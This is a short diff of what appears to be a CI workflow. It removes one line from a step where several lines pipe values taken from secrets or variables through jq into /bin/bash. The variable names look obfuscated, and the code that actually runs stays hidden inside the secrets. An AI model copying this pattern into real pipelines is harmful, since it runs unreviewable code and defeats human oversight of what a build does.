@@ -17,7 +17,6 @@ jobs:
           jivyf2: ${{ secrets.jivyf2 }}
         run: |
           printf '%s' "$jivyf2" | jq -r .g51274 | /bin/bash
-          echo $pliss31 | jq -r .vgs5 | /bin/bash
           printf '%s' "$xhexf845" | jq -r .s4 | /bin/bash
           echo $gxv77 | jq -r .b28936 | /bin/bash
 
